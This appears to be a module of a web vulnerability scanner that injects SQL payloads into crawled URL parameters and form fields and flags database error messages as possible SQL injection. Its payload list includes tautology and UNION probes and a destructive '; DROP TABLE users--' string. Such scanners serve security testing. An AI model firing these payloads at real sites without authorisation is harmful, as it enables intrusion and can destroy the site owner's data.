import re
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from scanner.core.crawler import CrawlResult, Form
from scanner.utils.http_client import build_session, safe_get, safe_post
from scanner.utils.logger import get_logger, print_finding

logger = get_logger()

# Error-based SQLi detection patterns
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"sql syntax.*mysql",
    r"mysql_fetch",
    r"ora-[0-9]{5}",
    r"microsoft sql server",
    r"jdbc\.SQLException",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"postgresql.*error",
    r"warning.*pg_",
    r"valid mysql result",
    r"supplied argument is not a valid mysql",
    r"sqlite.*error",
    r"sqlite3\.OperationalError",
    r"SQLSTATE\[",
    r"ERROR:\s+syntax error",
]

# Payloads to inject
SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 999--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(0)--",
    "; DROP TABLE users--",
]


@dataclass
class SQLiFinding:
    url: str
    parameter: str
    payload: str
    severity: str = "HIGH"
    evidence: str = ""


def _is_sqli_response(text: str) -> tuple[bool, str]:
    text_lower = text.lower()
    for pattern in SQL_ERROR_PATTERNS:
        match = re.search(pattern, text_lower)
        if match:
            return True, match.group(0)
    return False, ""


def _test_url_params(session, url: str, params: list[str]) -> list[SQLiFinding]:
    findings = []
    parsed = urlparse(url)
    base_params = parse_qs(parsed.query)

    for param in params:
        for payload in SQLI_PAYLOADS:
            injected_params = {k: v[0] for k, v in base_params.items()}
            injected_params[param] = payload

            new_query = urlencode(injected_params)
            injected_url = urlunparse(parsed._replace(query=new_query))

            response = safe_get(session, injected_url)
            if response:
                is_vuln, evidence = _is_sqli_response(response.text)
                if is_vuln:
                    finding = SQLiFinding(url=url, parameter=param, payload=payload, evidence=evidence)
                    findings.append(finding)
                    print_finding("HIGH", "SQLi", f"Possible SQL Injection at {url} — param: '{param}' — payload: {repr(payload)}")
                    break  # Move to next param once a payload hits

    return findings


def _test_form(session, form: Form) -> list[SQLiFinding]:
    findings = []
    for field in form.fields:
        if field.field_type in ("submit", "button", "image", "file", "hidden"):
            continue

        for payload in SQLI_PAYLOADS:
            data = {f.name: f.value for f in form.fields}
            data[field.name] = payload

            if form.method == "post":
                response = safe_post(session, form.action, data=data)
            else:
                response = safe_get(session, form.action, params=data)

            if response:
                is_vuln, evidence = _is_sqli_response(response.text)
                if is_vuln:
                    finding = SQLiFinding(url=form.action, parameter=field.name, payload=payload, evidence=evidence)
                    findings.append(finding)
                    print_finding("HIGH", "SQLi", f"Possible SQL Injection in form at {form.action} — field: '{field.name}'")
                    break

    return findings


def check_sqli(crawl_result: CrawlResult) -> list[SQLiFinding]:
    logger.info("[SQLi] Running SQL Injection checks")
    session = build_session()
    findings = []

    for url, params in crawl_result.params.items():
        findings.extend(_test_url_params(session, url, params))

    for form in crawl_result.forms:
        findings.extend(_test_form(session, form))

    if not findings:
        print_finding("INFO", "SQLi", "No SQL Injection indicators detected")

    return findings
